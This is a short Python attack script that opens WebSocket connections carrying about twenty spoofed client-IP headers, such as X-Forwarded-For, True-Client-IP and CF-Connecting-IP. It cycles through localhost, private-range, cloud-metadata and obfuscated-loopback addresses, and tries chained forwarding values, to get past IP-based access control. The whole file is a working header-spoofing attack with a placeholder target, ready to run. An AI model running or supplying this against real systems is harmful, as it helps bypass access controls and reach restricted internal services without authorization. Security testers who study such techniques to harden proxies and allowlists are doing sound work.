#!/usr/bin/env python3
import asyncio
import websockets
import random

async def test_xff_bypass(url, xff_ip):
    """Test WebSocket connection with X-Forwarded-For header"""
    headers = {
        'X-Forwarded-For': xff_ip,
        'X-Originating-IP': xff_ip,
        'X-Remote-IP': xff_ip,
        'X-Remote-Addr': xff_ip,
        'X-Real-IP': xff_ip,
        'X-Client-IP': xff_ip,
        'X-Forwarded-Host': 'localhost',
        'X-Forwarded-Proto': 'https',
        'True-Client-IP': xff_ip,
        'CF-Connecting-IP': xff_ip,  # Cloudflare
        'X-Forwarded': f'for={xff_ip}',
        'Forwarded': f'for={xff_ip}',
        'X-Cluster-Client-IP': xff_ip,
        'Client-IP': xff_ip,
        'Contact': xff_ip,
        'X-Originating-IP': xff_ip,
        'X-WAP-Profile': xff_ip,
        'X-ATT-DeviceId': xff_ip,
        'X-HTTP-Method-Override': 'GET',
    }
    
    try:
        async with websockets.connect(url, extra_headers=headers) as websocket:
            print(f"[+] Connected with X-Forwarded-For: {xff_ip}")
            
            # Send test message
            await websocket.send('{"message": "test"}')
            response = await asyncio.wait_for(websocket.recv(), timeout=2)
            print(f"[+] Response: {response[:100]}")
            return True
    except Exception as e:
        print(f"[-] Failed with {xff_ip}: {str(e)}")
        return False

async def test_multiple_ips(url):
    """Test with multiple spoofed IPs"""
    test_ips = [
        '127.0.0.1',           # Localhost
        '::1',                 # IPv6 localhost  
        '10.0.0.1',           # Private IP
        '192.168.1.1',        # Private IP
        '172.16.0.1',         # Private IP
        '169.254.169.254',    # AWS metadata
        '0.0.0.0',            # Wildcard
        '8.8.8.8',            # Google DNS
        '1.1.1.1',            # Cloudflare
        '127.1',              # Decimal notation
        '0x7f.0x0.0x0.0x1',  # Hex notation
        '0177.0.0.1',         # Octal notation
        '2130706433',         # Decimal IP (127.0.0.1)
        'localhost',          # Hostname
    ]
    
    print(f"[*] Testing {len(test_ips)} different IP spoofs...")
    for ip in test_ips:
        await test_xff_bypass(url, ip)
        await asyncio.sleep(0.5)

async def test_chained_ips(url):
    """Test with chained X-Forwarded-For"""
    chained_ips = [
        '127.0.0.1, 8.8.8.8',
        '192.168.1.1, 127.0.0.1',
        '127.0.0.1',
        '127.0.0.1, 192.168.1.1, 10.0.0.1',
    ]
    
    print("\n[*] Testing chained X-Forwarded-For headers...")
    for chain in chained_ips:
        await test_xff_bypass(url, chain)
        await asyncio.sleep(0.5)

async def main():
    # Replace with your target WebSocket URL
    target_url = "wss://example.com/chat"
    
    await test_multiple_ips(target_url)
    await test_chained_ips(target_url)

if __name__ == "__main__":
    asyncio.run(main())